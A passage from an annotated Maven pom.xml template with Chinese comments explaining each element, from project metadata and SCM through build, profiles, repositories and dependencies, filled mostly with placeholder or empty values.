项目当前版本，格式为:主版本.次版本.增量版本-限定版本号 --\x3e \r\n    <version> 1.0-SNAPSHOT </version> \r\n\r\n    \x3c!-- 项目的名称, Maven产生的文档用 --\x3e \r\n    <name> xxx-maven </name> \r\n\r\n    \x3c!-- 项目主页的URL, Maven产生的文档用 --\x3e \r\n    <url> http://maven.apache.org </url> \r\n\r\n    \x3c!-- 项目的详细描述, Maven 产生的文档用。 当这个元素能够用HTML格式描述时（例如，CDATA中的文本会被解析器忽略，\r\n         就可以包含HTML标签）， 不鼓励使用纯文本描述。如果你需要修改产生的web站点的索引页面，你应该修改你自己的\r\n         索引页文件，而不是调整这里的文档。 --\x3e \r\n    <description> A maven project to study maven. </description> \r\n\r\n    \x3c!-- 描述了这个项目构建环境中的前提条件。 --\x3e \r\n    <prerequisites> \r\n        \x3c!-- 构建该项目或使用该插件所需要的Maven的最低版本 --\x3e \r\n        <maven></maven> \r\n    </prerequisites> \r\n\r\n    \x3c!-- 项目的问题管理系统(Bugzilla, Jira, Scarab,或任何你喜欢的问题管理系统)的名称和URL，本例为 jira --\x3e \r\n    <issueManagement> \r\n        \x3c!-- 问题管理系统（例如jira）的名字， --\x3e \r\n        <system> jira </system> \r\n\r\n        \x3c!-- 该项目使用的问题管理系统的URL --\x3e \r\n        <url> http://jira.baidu.com/banseon </url> \r\n    </issueManagement> \r\n\r\n    \x3c!-- 项目持续集成信息 --\x3e \r\n    <ciManagement> \r\n        \x3c!-- 持续集成系统的名字，例如continuum --\x3e \r\n        <system></system> \r\n\r\n        \x3c!-- 该项目使用的持续集成系统的URL（如果持续集成系统有web接口的话）。 --\x3e \r\n        <url></url> \r\n\r\n        \x3c!-- 构建完成时，需要通知的开发者/用户的配置项。包括被通知者信息和通知条件（错误，失败，成功，警告） --\x3e \r\n        <notifiers> \r\n            \x3c!-- 配置一种方式，当构建中断时，以该方式通知用户/开发者 --\x3e \r\n            <notifier> \r\n                \x3c!-- 传送通知的途径 --\x3e \r\n                <type></type> \r\n\r\n                \x3c!-- 发生错误时是否通知 --\x3e \r\n                <sendOnError></sendOnError> \r\n\r\n                \x3c!-- 构建失败时是否通知 --\x3e \r\n                <sendOnFailure></sendOnFailure> \r\n\r\n                \x3c!-- 构建成功时是否通知 --\x3e \r\n                <sendOnSuccess></sendOnSuccess> \r\n\r\n                \x3c!-- 发生警告时是否通知 --\x3e \r\n                <sendOnWarning></sendOnWarning> \r\n\r\n                \x3c!-- 不赞成使用。通知发送到哪里 --\x3e \r\n                <address></address> \r\n\r\n                \x3c!-- 扩展配置项 --\x3e \r\n                <configuration></configuration> \r\n            </notifier> \r\n        </notifiers> \r\n    </ciManagement> \r\n\r\n    \x3c!-- 项目创建年份，4位数字。当产生版权信息时需要使用这个值。 --\x3e \r\n    <inceptionYear /> \r\n\r\n    \x3c!-- 项目相关邮件列表信息 --\x3e \r\n    <mailingLists> \r\n        \x3c!-- 该元素描述了项目相关的所有邮件列表。自动产生的网站引用这些信息。 --\x3e \r\n        <mailingList> \r\n            \x3c!-- 邮件的名称 --\x3e \r\n            <name> Demo </name> \r\n\r\n            \x3c!-- 发送邮件的地址或链接，如果是邮件地址，创建文档时，mailto: 链接会被自动创建 --\x3e \r\n            <post> banseon@126.com </post> \r\n\r\n            \x3c!-- 订阅邮件的地址或链接，如果是邮件地址，创建文档时，mailto: 链接会被自动创建 --\x3e \r\n            <subscribe> banseon@126.com </subscribe> \r\n\r\n            \x3c!-- 取消订阅邮件的地址或链接，如果是邮件地址，创建文档时，mailto: 链接会被自动创建 --\x3e \r\n            <unsubscribe> banseon@126.com </unsubscribe> \r\n\r\n            \x3c!-- 你可以浏览邮件信息的URL --\x3e \r\n            <archive> http:/hi.baidu.com/banseon/demo/dev/ </archive> \r\n        </mailingList> \r\n    </mailingLists> \r\n\r\n    \x3c!-- 项目开发者列表 --\x3e \r\n    <developers> \r\n        \x3c!-- 某个项目开发者的信息 --\x3e \r\n        <developer> \r\n            \x3c!-- SCM里项目开发者的唯一标识符 --\x3e \r\n            <id> HELLO WORLD </id>\r\n            \r\n            \x3c!-- 项目开发者的全名 --\x3e \r\n            <name> banseon </name> \r\n\r\n            \x3c!-- 项目开发者的email --\x3e \r\n            <email> banseon@126.com </email> \r\n\r\n            \x3c!-- 项目开发者的主页的URL --\x3e \r\n            <url></url> \r\n\r\n            \x3c!-- 项目开发者在项目中扮演的角色，角色元素描述了各种角色 --\x3e \r\n            <roles> \r\n                <role> Project Manager </role> \r\n                <role> Architect </role> \r\n            </roles> \r\n\r\n            \x3c!-- 项目开发者所属组织 --\x3e \r\n            <organization> demo </organization> \r\n\r\n            \x3c!-- 项目开发者所属组织的URL --\x3e \r\n            <organizationUrl> http://hi.baidu.com/xxx </organizationUrl> \r\n\r\n            \x3c!-- 项目开发者属性，如即时消息如何处理等 --\x3e \r\n            <properties> \r\n                <dept> No </dept> \r\n            </properties> \r\n\r\n            \x3c!-- 项目开发者所在时区， -11到12范围内的整数。 --\x3e \r\n            <timezone> -5 </timezone> \r\n        </developer> \r\n    </developers> \r\n\r\n    \x3c!-- 项目的其他贡献者列表 --\x3e \r\n    <contributors> \r\n        \x3c!-- 项目的其他贡献者。参见developers/developer元素 --\x3e \r\n        <contributor> \r\n            \x3c!-- 项目贡献者的全名 --\x3e \r\n            <name></name>\r\n\r\n            \x3c!-- 项目贡献者的email --\x3e\r\n            <email></email>\r\n\r\n            \x3c!-- 项目贡献者的主页的URL --\x3e\r\n            <url></url>\r\n\r\n            \x3c!-- 项目贡献者所属组织 --\x3e\r\n            <organization></organization>\r\n\r\n            \x3c!-- 项目贡献者所属组织的URL --\x3e\r\n            <organizationUrl></organizationUrl>\r\n\r\n            \x3c!-- 项目贡献者在项目中扮演的角色，角色元素描述了各种角色 --\x3e \r\n            <roles> \r\n                <role> Project Manager </role> \r\n                <role> Architect </role> \r\n            </roles>\r\n\r\n            \x3c!-- 项目贡献者所在时区， -11到12范围内的整数。 --\x3e \r\n            <timezone></timezone>\r\n            \r\n            \x3c!-- 项目贡献者属性，如即时消息如何处理等 --\x3e \r\n            <properties> \r\n                <dept> No </dept> \r\n            </properties>  \r\n        </contributor> \r\n    </contributors> \r\n\r\n    \x3c!-- 该元素描述了项目所有License列表。 应该只列出该项目的license列表，不要列出依赖项目的 license列表。\r\n         如果列出多个license，用户可以选择它们中的一个而不是接受所有license。 --\x3e \r\n    <licenses> \r\n        \x3c!-- 描述了项目的license，用于生成项目的web站点的license页面，其他一些报表和validation也会用到该元素。 --\x3e \r\n        <license> \r\n            \x3c!-- license用于法律上的名称 --\x3e \r\n            <name> Apache 2 </name> \r\n\r\n            \x3c!-- 官方的license正文页面的URL --\x3e \r\n            <url> http://www.baidu.com/banseon/LICENSE-2.0.txt </url> \r\n\r\n            \x3c!-- 项目分发的主要方式： \r\n                    repo，可以从Maven库下载 \r\n                    manual， 用户必须手动下载和安装依赖 --\x3e \r\n            <distribution> repo </distribution> \r\n\r\n            \x3c!-- 关于license的补充信息 --\x3e \r\n            <comments> A business-friendly OSS license </comments> \r\n        </license> \r\n    </licenses> \r\n\r\n    \x3c!-- SCM(Source Control Management)标签允许你配置你的代码库，供Maven web站点和其它插件使用。 --\x3e \r\n    <scm> \r\n        \x3c!-- SCM的URL,该URL描述了版本库和如何连接到版本库。欲知详情，请看SCMs提供的URL格式和列表。该连接只读。 --\x3e \r\n        <connection> \r\n            scm:svn:http://svn.baidu.com/banseon/maven/banseon/banseon-maven2-trunk(dao-trunk)\r\n        </connection> \r\n\r\n        \x3c!-- 给开发者使用的，类似connection元素。即该连接不仅仅只读 --\x3e \r\n        <developerConnection> \r\n            scm:svn:http://svn.baidu.com/banseon/maven/banseon/dao-trunk \r\n        </developerConnection> \r\n\r\n        \x3c!-- 当前代码的标签，在开发阶段默认为HEAD --\x3e \r\n        <tag></tag> \r\n\r\n        \x3c!-- 指向项目的可浏览SCM库（例如ViewVC或者Fisheye）的URL。 --\x3e \r\n        <url> http://svn.baidu.com/banseon </url> \r\n    </scm> \r\n\r\n    \x3c!-- 描述项目所属组织的各种属性。Maven产生的文档用 --\x3e \r\n    <organization> \r\n        \x3c!-- 组织的全名 --\x3e \r\n        <name> demo </name> \r\n\r\n        \x3c!-- 组织主页的URL --\x3e \r\n        <url> http://www.baidu.com/banseon </url> \r\n    </organization> \r\n\r\n    \x3c!-- 构建项目需要的信息 --\x3e \r\n    <build> \r\n        \x3c!-- 该元素设置了项目源码目录，当构建项目的时候，构建系统会编译目录里的源码。该路径是相对\r\n             于pom.xml的相对路径。 --\x3e \r\n        <sourceDirectory></sourceDirectory> \r\n\r\n        \x3c!-- 该元素设置了项目脚本源码目录，该目录和源码目录不同：绝大多数情况下，该目录下的内容会\r\n             被拷贝到输出目录(因为脚本是被解释的，而不是被编译的)。 --\x3e \r\n        <scriptSourceDirectory></scriptSourceDirectory> \r\n\r\n        \x3c!-- 该元素设置了项目单元测试使用的源码目录，当测试项目的时候，构建系统会编译目录里的源码。\r\n             该路径是相对于pom.xml的相对路径。 --\x3e \r\n        <testSourceDirectory></testSourceDirectory> \r\n\r\n        \x3c!-- 被编译过的应用程序class文件存放的目录。 --\x3e \r\n        <outputDirectory></outputDirectory> \r\n\r\n        \x3c!-- 被编译过的测试class文件存放的目录。 --\x3e \r\n        <testOutputDirectory></testOutputDirectory> \r\n\r\n        \x3c!-- 使用来自该项目的一系列构建扩展 --\x3e \r\n        <extensions> \r\n            \x3c!-- 描述使用到的构建扩展。 --\x3e \r\n            <extension> \r\n                \x3c!-- 构建扩展的groupId --\x3e \r\n                <groupId></groupId> \r\n\r\n                \x3c!-- 构建扩展的artifactId --\x3e \r\n                <artifactId></artifactId> \r\n\r\n                \x3c!-- 构建扩展的版本 --\x3e \r\n                <version></version> \r\n            </extension> \r\n        </extensions> \r\n\r\n        \x3c!-- 当项目没有规定目标（Maven2 叫做阶段）时的默认值 --\x3e \r\n        <defaultGoal></defaultGoal> \r\n\r\n        \x3c!-- 这个元素描述了项目相关的所有资源路径列表，例如和项目相关的属性文件，这些资源被包含在\r\n             最终的打包文件里。 --\x3e \r\n        <resources> \r\n            \x3c!-- 这个元素描述了项目相关或测试相关的所有资源路径 --\x3e \r\n            <resource> \r\n                \x3c!-- 描述了资源的目标路径。该路径相对target/classes目录（例如${project.build.outputDirectory}）。\r\n                     举个例子，如果你想资源在特定的包里(org.apache.maven.messages)，你就必须该元素设置为\r\n                    org/apache/maven/messages。然而，如果你只是想把资源放到源码目录结构里，就不需要该配置。 --\x3e \r\n                <targetPath></targetPath> \r\n\r\n                \x3c!-- 是否使用参数值代替参数名。参数值取自properties元素或者文件里配置的属性，文件在filters元素\r\n                     里列出。 --\x3e \r\n                <filtering></filtering>\r\n\r\n                \x3c!-- 描述存放资源的目录，该路径相对POM路径 --\x3e \r\n                <directory></directory>\r\n\r\n                \x3c!-- 包含的模式列表，例如**/*.xml. --\x3e \r\n                <includes>\r\n                    <include></include>\r\n                </includes>\r\n\r\n                \x3c!-- 排除的模式列表，例如**/*.xml --\x3e\r\n                <excludes>\r\n                    <exclude></exclude>\r\n                </excludes>\r\n            </resource> \r\n        </resources> \r\n\r\n        \x3c!-- 这个元素描述了单元测试相关的所有资源路径，例如和单元测试相关的属性文件。 --\x3e \r\n        <testResources> \r\n            \x3c!-- 这个元素描述了测试相关的所有资源路径，参见build/resources/resource元素的说明 --\x3e \r\n            <testResource> \r\n                \x3c!-- 描述了测试相关的资源的目标路径。该路径相对target/classes目录（例如${project.build.outputDirectory}）。\r\n                     举个例子，如果你想资源在特定的包里(org.apache.maven.messages)，你就必须该元素设置为\r\n                    org/apache/maven/messages。然而，如果你只是想把资源放到源码目录结构里，就不需要该配置。 --\x3e \r\n                <targetPath></targetPath> \r\n\r\n                \x3c!-- 是否使用参数值代替参数名。参数值取自properties元素或者文件里配置的属性，文件在filters元素\r\n                     里列出。 --\x3e \r\n                <filtering></filtering>\r\n\r\n                \x3c!-- 描述存放测试相关的资源的目录，该路径相对POM路径 --\x3e \r\n                <directory></directory>\r\n\r\n                \x3c!-- 包含的模式列表，例如**/*.xml. --\x3e \r\n                <includes>\r\n                    <include></include>\r\n                </includes>\r\n\r\n                \x3c!-- 排除的模式列表，例如**/*.xml --\x3e\r\n                <excludes>\r\n                    <exclude></exclude>\r\n                </excludes> \r\n            </testResource> \r\n        </testResources> \r\n\r\n        \x3c!-- 构建产生的所有文件存放的目录 --\x3e \r\n        <directory></directory> \r\n\r\n        \x3c!-- 产生的构件的文件名，默认值是${artifactId}-${version}。 --\x3e \r\n        <finalName></finalName> \r\n\r\n        \x3c!-- 当filtering开关打开时，使用到的过滤器属性文件列表 --\x3e \r\n        <filters></filters> \r\n\r\n        \x3c!-- 子项目可以引用的默认插件信息。该插件配置项直到被引用时才会被解析或绑定到生命周期。给定插件的任何本\r\n             地配置都会覆盖这里的配置 --\x3e \r\n        <pluginManagement> \r\n            \x3c!-- 使用的插件列表 。 --\x3e \r\n            <plugins> \r\n                \x3c!-- plugin元素包含描述插件所需要的信息。 --\x3e \r\n                <plugin> \r\n                    \x3c!-- 插件在仓库里的group ID --\x3e \r\n                    <groupId></groupId> \r\n\r\n                    \x3c!-- 插件在仓库里的artifact ID --\x3e \r\n                    <artifactId></artifactId> \r\n\r\n                    \x3c!-- 被使用的插件的版本（或版本范围） --\x3e \r\n                    <version></version> \r\n\r\n                    \x3c!-- 是否从该插件下载Maven扩展（例如打包和类型处理器），由于性能原因，只有在真需要下载时，该\r\n                         元素才被设置成enabled。 --\x3e \r\n                    <extensions>true/false</extensions> \r\n\r\n                    \x3c!-- 在构建生命周期中执行一组目标的配置。每个目标可能有不同的配置。 --\x3e \r\n                    <executions> \r\n                        \x3c!-- execution元素包含了插件执行需要的信息 --\x3e \r\n                        <execution> \r\n                            \x3c!-- 执行目标的标识符，用于标识构建过程中的目标，或者匹配继承过程中需要合并的执行目标 --\x3e \r\n                            <id></id>\r\n\r\n                            \x3c!-- 绑定了目标的构建生命周期阶段，如果省略，目标会被绑定到源数据里配置的默认阶段 --\x3e \r\n                            <phase></phase>\r\n\r\n                            \x3c!-- 配置的执行目标 --\x3e \r\n                            <goals></goals> \r\n\r\n                            \x3c!-- 配置是否被传播到子POM --\x3e \r\n                            <inherited>true/false</inherited> \r\n\r\n                            \x3c!-- 作为DOM对象的配置 --\x3e \r\n                            <configuration></configuration>\r\n                        </execution> \r\n                    </executions> \r\n\r\n                    \x3c!-- 项目引入插件所需要的额外依赖 --\x3e \r\n                    <dependencies>\r\n                        \x3c!-- 参见dependencies/dependency元素 --\x3e \r\n                        <dependency> \r\n                        </dependency> \r\n                    </dependencies> \r\n\r\n                    \x3c!-- 任何配置是否被传播到子项目 --\x3e \r\n                    <inherited>true/false</inherited>\r\n\r\n                    \x3c!-- 作为DOM对象的配置 --\x3e \r\n                    <configuration></configuration>\r\n                </plugin> \r\n            </plugins> \r\n        </pluginManagement> \r\n\r\n        \x3c!-- 该项目使用的插件列表 。 --\x3e \r\n        <plugins> \r\n            \x3c!-- plugin元素包含描述插件所需要的信息。 --\x3e \r\n            <plugin> \r\n                \x3c!-- 插件在仓库里的group ID --\x3e \r\n                <groupId></groupId> \r\n\r\n                \x3c!-- 插件在仓库里的artifact ID --\x3e \r\n                <artifactId></artifactId> \r\n\r\n                \x3c!-- 被使用的插件的版本（或版本范围） --\x3e \r\n                <version></version> \r\n\r\n                \x3c!-- 是否从该插件下载Maven扩展（例如打包和类型处理器），由于性能原因，只有在真需要下载时，该\r\n                     元素才被设置成enabled。 --\x3e \r\n                <extensions>true/false</extensions> \r\n\r\n                \x3c!-- 在构建生命周期中执行一组目标的配置。每个目标可能有不同的配置。 --\x3e \r\n                <executions> \r\n                    \x3c!-- execution元素包含了插件执行需要的信息 --\x3e \r\n                    <execution> \r\n                        \x3c!-- 执行目标的标识符，用于标识构建过程中的目标，或者匹配继承过程中需要合并的执行目标 --\x3e \r\n                        <id></id>\r\n\r\n                        \x3c!-- 绑定了目标的构建生命周期阶段，如果省略，目标会被绑定到源数据里配置的默认阶段 --\x3e \r\n                        <phase></phase>\r\n\r\n                        \x3c!-- 配置的执行目标 --\x3e \r\n                        <goals></goals> \r\n\r\n                        \x3c!-- 配置是否被传播到子POM --\x3e \r\n                        <inherited>true/false</inherited> \r\n\r\n                        \x3c!-- 作为DOM对象的配置 --\x3e \r\n                        <configuration></configuration>\r\n                    </execution> \r\n                </executions> \r\n\r\n                \x3c!-- 项目引入插件所需要的额外依赖 --\x3e \r\n                <dependencies>\r\n                    \x3c!-- 参见dependencies/dependency元素 --\x3e \r\n                    <dependency> \r\n                    </dependency> \r\n                </dependencies> \r\n\r\n                \x3c!-- 任何配置是否被传播到子项目 --\x3e \r\n                <inherited>true/false</inherited> \r\n\r\n                \x3c!-- 作为DOM对象的配置 --\x3e \r\n                <configuration></configuration> \r\n            </plugin> \r\n        </plugins>\r\n    </build> \r\n\r\n    \x3c!-- 在列的项目构建profile，如果被激活，会修改构建处理 --\x3e \r\n    <profiles> \r\n        \x3c!-- 根据环境参数或命令行参数激活某个构建处理 --\x3e \r\n        <profile> \r\n            \x3c!-- 构建配置的唯一标识符。即用于命令行激活，也用于在继承时合并具有相同标识符的profile。 --\x3e \r\n            <id></id>\r\n\r\n            \x3c!-- 自动触发profile的条件逻辑。Activation是profile的开启钥匙。profile的力量来自于它能够\r\n                 在某些特定的环境中自动使用某些特定的值；这些环境通过activation元素指定。activation元\r\n                 素并不是激活profile的唯一方式。 --\x3e \r\n            <activation> \r\n                \x3c!-- profile默认是否激活的标志 --\x3e \r\n                <activeByDefault>true/false</activeByDefault> \r\n\r\n                \x3c!-- 当匹配的jdk被检测到，profile被激活。例如，1.4激活JDK1.4，1.4.0_2，而!1.4激活所有版本\r\n                     不是以1.4开头的JDK。 --\x3e \r\n                <jdk>jdk版本，如:1.7</jdk> \r\n\r\n                \x3c!-- 当匹配的操作系统属性被检测到，profile被激活。os元素可以定义一些操作系统相关的属性。 --\x3e \r\n                <os> \r\n                    \x3c!-- 激活profile的操作系统的名字 --\x3e \r\n                    <name> Windows XP </name> \r\n\r\n                    \x3c!-- 激活profile的操作系统所属家族(如 \'windows\') --\x3e \r\n                    <family> Windows </family> \r\n\r\n                    \x3c!-- 激活profile的操作系统体系结构 --\x3e \r\n                    <arch> x86 </arch> \r\n\r\n                    \x3c!-- 激活profile的操作系统版本 --\x3e \r\n                    <version> 5.1.2600 </version> \r\n                </os> \r\n\r\n                \x3c!-- 如果Maven检测到某一个属性（其值可以在POM中通过${名称}引用），其拥有对应的名称和值，Profile\r\n                     就会被激活。如果值字段是空的，那么存在属性名称字段就会激活profile，否则按区分大小写方式匹\r\n                     配属性值字段 --\x3e \r\n                <property> \r\n                    \x3c!-- 激活profile的属性的名称 --\x3e \r\n                    <name> mavenVersion </name> \r\n\r\n                    \x3c!-- 激活profile的属性的值 --\x3e \r\n                    <value> 2.0.3 </value> \r\n                </property> \r\n\r\n                \x3c!-- 提供一个文件名，通过检测该文件的存在或不存在来激活profile。missing检查文件是否存在，如果不存在则激活 \r\n                     profile。另一方面，exists则会检查文件是否存在，如果存在则激活profile。 --\x3e \r\n                <file> \r\n                    \x3c!-- 如果指定的文件存在，则激活profile。 --\x3e \r\n                    <exists> /usr/local/hudson/hudson-home/jobs/maven-guide-zh-to-production/workspace/ </exists> \r\n\r\n                    \x3c!-- 如果指定的文件不存在，则激活profile。 --\x3e \r\n                    <missing> /usr/local/hudson/hudson-home/jobs/maven-guide-zh-to-production/workspace/ </missing> \r\n                </file> \r\n            </activation> \r\n\r\n            \x3c!-- 构建项目所需要的信息。参见build元素 --\x3e \r\n            <build> \r\n                <defaultGoal /> \r\n                <resources> \r\n                    <resource> \r\n                        <targetPath></targetPath>\r\n                        <filtering></filtering>\r\n                        <directory></directory>\r\n                        <includes>\r\n                            <include></include>\r\n                        </includes>\r\n                        <excludes>\r\n                            <exclude></exclude>\r\n                        </excludes>\r\n                    </resource> \r\n                </resources> \r\n                <testResources> \r\n                    <testResource> \r\n                        <targetPath></targetPath>\r\n                        <filtering></filtering>\r\n                        <directory></directory>\r\n                        <includes>\r\n                            <include></include>\r\n                        </includes>\r\n                        <excludes>\r\n                            <exclude></exclude>\r\n                        </excludes> \r\n                    </testResource> \r\n                </testResources> \r\n                <directory></directory>\r\n                <finalName></finalName>\r\n                <filters></filters> \r\n                <pluginManagement> \r\n                    <plugins> \r\n                        \x3c!-- 参见build/pluginManagement/plugins/plugin元素 --\x3e \r\n                        <plugin> \r\n                            <groupId></groupId>\r\n                            <artifactId></artifactId>\r\n                            <version></version>\r\n                            <extensions>true/false</extensions> \r\n                            <executions> \r\n                                <execution> \r\n                                    <id></id>\r\n                                    <phase></phase>\r\n                                    <goals></goals>\r\n                                    <inherited>true/false</inherited>\r\n                                    <configuration></configuration> \r\n                                </execution> \r\n                            </executions> \r\n                            <dependencies> \r\n                                \x3c!-- 参见dependencies/dependency元素 --\x3e \r\n                                <dependency> \r\n                                </dependency> \r\n                            </dependencies> \r\n                            <goals></goals>\r\n                            <inherited>true/false</inherited>\r\n                            <configuration></configuration>\r\n                        </plugin> \r\n                    </plugins> \r\n                </pluginManagement> \r\n                <plugins> \r\n                    \x3c!-- 参见build/pluginManagement/plugins/plugin元素 --\x3e \r\n                    <plugin> \r\n                        <groupId></groupId>\r\n                        <artifactId></artifactId>\r\n                        <version></version>\r\n                        <extensions>true/false</extensions> \r\n                        <executions> \r\n                            <execution> \r\n                                <id></id>\r\n                                <phase></phase>\r\n                                <goals></goals>\r\n                                <inherited>true/false</inherited>\r\n                                <configuration></configuration> \r\n                            </execution> \r\n                        </executions> \r\n                        <dependencies> \r\n                            \x3c!-- 参见dependencies/dependency元素 --\x3e \r\n                            <dependency> \r\n                            </dependency> \r\n                        </dependencies> \r\n                        <goals></goals>\r\n                        <inherited>true/false</inherited>\r\n                        <configuration></configuration> \r\n                    </plugin> \r\n                </plugins> \r\n            </build> \r\n\r\n            \x3c!-- 模块（有时称作子项目） 被构建成项目的一部分。列出的每个模块元素是指向该模块的目录的\r\n                 相对路径 --\x3e \r\n            <modules>\r\n                \x3c!--子项目相对路径--\x3e\r\n                <module></module>\r\n            </modules> \r\n\r\n            \x3c!-- 发现依赖和扩展的远程仓库列表。 --\x3e \r\n            <repositories> \r\n                \x3c!-- 参见repositories/repository元素 --\x3e \r\n                <repository> \r\n                    <releases> \r\n                        <enabled><enabled>\r\n                        <updatePolicy></updatePolicy>\r\n                        <checksumPolicy></checksumPolicy> \r\n                    </releases> \r\n                    <snapshots> \r\n                        <enabled><enabled>\r\n                        <updatePolicy></updatePolicy>\r\n                        <checksumPolicy></checksumPolicy> \r\n                    </snapshots> \r\n                    <id></id>\r\n                    <name></name>\r\n                    <url></url>\r\n                    <layout></layout> \r\n                </repository> \r\n            </repositories> \r\n\r\n            \x3c!-- 发现插件的远程仓库列表，这些插件用于构建和报表 --\x3e \r\n            <pluginRepositories> \r\n                \x3c!-- 包含需要连接到远程插件仓库的信息.参见repositories/repository元素 --\x3e \r\n                <pluginRepository> \r\n                    <releases> \r\n                        <enabled><enabled>\r\n                        <updatePolicy></updatePolicy>\r\n                        <checksumPolicy></checksumPolicy> \r\n                    </releases> \r\n                    <snapshots> \r\n                        <enabled><enabled>\r\n                        <updatePolicy></updatePolicy>\r\n                        <checksumPolicy></checksumPolicy>\r\n                    </snapshots> \r\n                    <id></id>\r\n                    <name></name>\r\n                    <url></url>\r\n                    <layout></layout> \r\n                </pluginRepository> \r\n            </pluginRepositories> \r\n\r\n            \x3c!-- 该元素描述了项目相关的所有依赖。 这些依赖组成了项目构建过程中的一个个环节。它们自动从项目定义的\r\n                 仓库中下载。要获取更多信息，请看项目依赖机制。 --\x3e \r\n            <dependencies> \r\n                \x3c!-- 参见dependencies/dependency元素 --\x3e \r\n                <dependency> \r\n                </dependency> \r\n            </dependencies> \r\n\r\n            \x3c!-- 不赞成使用. 现在Maven忽略该元素. --\x3e \r\n            <reports></reports> \r\n\r\n            \x3c!-- 该元素包括使用报表插件产生报表的规范。当用户执行“mvn site”，这些报表就会运行。 在页面导航栏能看\r\n                 到所有报表的链接。参见reporting元素 --\x3e \r\n            <reporting></reporting> \r\n\r\n            \x3c!-- 参见dependencyManagement元素 --\x3e \r\n            <dependencyManagement> \r\n                <dependencies> \r\n                    \x3c!-- 参见dependencies/dependency元素 --\x3e \r\n                    <dependency> \r\n                    </dependency> \r\n                </dependencies> \r\n            </dependencyManagement> \r\n\r\n            \x3c!-- 参见distributionManagement元素 --\x3e \r\n            <distributionManagement> \r\n            </distributionManagement> \r\n\r\n            \x3c!-- 参见properties元素 --\x3e \r\n            <properties /> \r\n        </profile> \r\n    </profiles> \r\n\r\n    \x3c!-- 模块（有时称作子项目） 被构建成项目的一部分。列出的每个模块元素是指向该模块的目录的相对路径 --\x3e \r\n    <modules>\r\n        \x3c!--子项目相对路径--\x3e\r\n        <module></module>\r\n    </modules> \r\n\r\n    \x3c!-- 发现依赖和扩展的远程仓库列表。 --\x3e \r\n    <repositories> \r\n        \x3c!-- 包含需要连接到远程仓库的信息 --\x3e \r\n        <repository> \r\n            \x3c!-- 如何处理远程仓库里发布版本的下载 --\x3e \r\n            <releases> \r\n                \x3c!-- true或者false表示该仓库是否为下载某种类型构件（发布版，快照版）开启。 --\x3e \r\n                <enabled><enabled> \r\n\r\n                \x3c!-- 该元素指定更新发生的频率。Maven会比较本地POM和远程POM的时间戳。这里的选项是：always（一直），\r\n                     daily（默认，每日），interval：X（这里X是以分钟为单位的时间间隔），或者never（从不）。 --\x3e \r\n                <updatePolicy></updatePolicy> \r\n\r\n                \x3c!-- 当Maven验证构件校验文件失败时该怎么做：ignore（忽略），fail（失败），或者warn（警告）。 --\x3e \r\n                <checksumPolicy></checksumPolicy> \r\n            </releases> \r\n\r\n            \x3c!-- 如何处理远程仓库里快照版本的下载。有了releases和snapshots这两组配置，POM就可以在每个单独的仓库中，\r\n                 为每种类型的构件采取不同的策略。例如，可能有人会决定只为开发目的开启对快照版本下载的支持。参见repositories/repository/releases元素 --\x3e \r\n            <snapshots> \r\n                <enabled><enabled>\r\n                <updatePolicy></updatePolicy>\r\n                <checksumPolicy></checksumPolicy> \r\n            </snapshots> \r\n\r\n            \x3c!-- 远程仓库唯一标识符。可以用来匹配在settings.xml文件里配置的远程仓库 --\x3e \r\n            <id> banseon-repository-proxy </id> \r\n\r\n            \x3c!-- 远程仓库名称 --\x3e \r\n            <name> banseon-repository-proxy </name> \r\n\r\n            \x3c!-- 远程仓库URL，按protocol://hostname/path形式 --\x3e \r\n            <url> http://192.168.1.169:9999/repository/ </url> \r\n\r\n            \x3c!-- 用于定位和排序构件的仓库布局类型-可以是default（默认）或者legacy（遗留）。Maven 2为其仓库提供了一个默认\r\n                 的布局；然而，Maven 1.x有一种不同的布局。我们可以使用该元素指定布局是default（默认）还是legacy（遗留）。 --\x3e \r\n            <layout> default </layout> \r\n        </repository> \r\n    </repositories> \r\n\r\n    \x3c!-- 发现插件的远程仓库列表，这些插件用于构建和报表 --\x3e \r\n    <pluginRepositories> \r\n        \x3c!-- 包含需要连接到远程插件仓库的信息.参见repositories/repository元素 --\x3e \r\n        <pluginRepository> \r\n        </pluginRepository> \r\n    </pluginRepositories> \r\n\r\n    \x3c!-- 该元素描述了项目相关的所有依赖。 这些依赖组成了项目构建过程中的一个个环节。它们自动从项目定义的仓库中下载。\r\n         要获取更多信息，请看项目依赖机制。 --\x3e \r\n    <dependencies> \r\n        <dependency> \r\n            \x3c!-- 依赖的group ID --\x3e \r\n            <groupId> org.apache.maven </groupId> \r\n\r\n            \x3c!-- 依赖的artifact ID --\x3e \r\n            <artifactId> maven-artifact </artifactId> \r\n\r\n            \x3c!-- 依赖的版本号。 在Maven 2里, 也可以配置成版本号的范围。 --\x3e \r\n            <version> 3.8.1 </version> \r\n\r\n            \x3c!-- 依赖类型，默认类型是jar。它通常表示依赖的文件的扩展名，但也有例外。一个类型可以被映射成另外一个扩展\r\n                 名或分类器。类型经常和使用的打包方式对应，尽管这也有例外。一些类型的例子：jar，war，ejb-client和test-jar。\r\n                 如果设置extensions为 true，就可以在plugin里定义新的类型。所以前面的类型的例子不完整。 --\x3e \r\n            <type> jar </type> \r\n\r\n            \x3c!-- 依赖的分类器。分类器可以区分属于同一个POM，但不同构建方式的构件。分类器名被附加到文件名的版本号后面。例如，\r\n                 如果你想要构建两个单独的构件成JAR，一个使用Java 1.4编译器，另一个使用Java 6编译器，你就可以使用分类器来生\r\n                 成两个单独的JAR构件。 --\x3e \r\n            <classifier></classifier> \r\n\r\n            \x3c!-- 依赖范围。在项目发布过程中，帮助决定哪些构件被包括进来。欲知详情请参考依赖机制。 \r\n                - compile ：默认范围，用于编译 \r\n                - provided：类似于编译，但支持你期待jdk或者容器提供，类似于classpath \r\n                - runtime: 在执行时需要使用 \r\n                - test: 用于test任务时使用 \r\n                - system: 需要外在提供相应的元素。通过systemPath来取得 \r\n                - systemPath: 仅用于范围为system。提供相应的路径 \r\n                - optional: 当项目自身被依赖时，标注依赖是否传递。用于连续依赖时使用 --\x3e \r\n            <scope> test </scope> \r\n\r\n            \x3c!-- 仅供system范围使用。注意，不鼓励使用这个元素，并且在新的版本中该元素可能被覆盖掉。该元素为依赖规定了文件\r\n                 系统上的路径。需要绝对路径而不是相对路径。推荐使用属性匹配绝对路径，例如${java.home}。 --\x3e \r\n            <systemPath></systemPath> \r\n\r\n            \x3c!-- 当计算传递依赖时， 从依赖构件列表里，列出被排除的依赖构件集。即告诉maven你只依赖指定的项目，不依赖项目的\r\n                 依赖。此元素主要用于解决版本冲突问题 --\x3e \r\n            <exclusions> \r\n                <exclusion> \r\n                    <artifactId> spring-core </artifactId> 